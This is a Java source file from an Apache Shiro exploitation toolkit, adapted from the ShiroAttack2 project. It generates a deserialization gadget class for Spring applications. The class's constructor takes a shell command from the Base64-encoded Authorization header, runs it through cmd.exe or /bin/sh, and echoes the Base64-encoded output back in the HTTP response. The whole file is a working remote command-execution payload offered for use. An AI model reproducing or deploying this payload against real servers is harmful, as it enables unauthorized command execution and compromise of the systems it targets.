/**
 * Thanks to <b>summersec</b>
 * Source: https://github.com/SummerSec/ShiroAttack2/blob/master/src/main/java/com/summersec/attack/deser/echo/SpringEcho.java
 */
package com.y5neko.shiroexp.gadget;

import javassist.*;

public class SpringEcho {
    public CtClass genPayload(ClassPool pool) throws NotFoundException, CannotCompileException {
        CtClass clazz = pool.makeClass("com.ysneko.Security" + System.nanoTime());

        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addConstructor(CtNewConstructor.make("public SpringEcho() throws Exception {\n" +
                "            try {\n" +
                "                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n" +
                "                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n" +
                "                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n" +
                "\n" +
                "                String te = httprequest.getHeader(\"Host\");\n" +
                "                httpresponse.addHeader(\"Host\", te);\n" +
                "                String tc = httprequest.getHeader(\"Authorization\");\n" +
                "                if (tc != null && !tc.isEmpty()) {\n" +
                "                    String p = org.apache.shiro.codec.Base64.decodeToString(tc.replaceAll(\"Basic \", \"\"));\n" +
                "                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"windows\") ? new String[]{\"cmd.exe\", \"/c\", p} : new String[]{\"/bin/sh\", \"-c\", p};\n" +
                "                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
                "                    String base64Str = \"\";\n" +
                "                    base64Str = org.apache.shiro.codec.Base64.encodeToString(result);\n" +
                "                    httpresponse.getWriter().write(\"$$$\" + base64Str + \"$$$\");\n" +
                "\n" +
                "                }\n" +
                "                httpresponse.getWriter().flush();\n" +
                "                httpresponse.getWriter().close();\n" +
                "            } catch (Exception e) {\n" +
                "                e.getStackTrace();\n" +
                "            }\n" +
                "        }", clazz));

        // 兼容低版本jdk
        clazz.getClassFile().setMajorVersion(50);
        return clazz;
    }
}
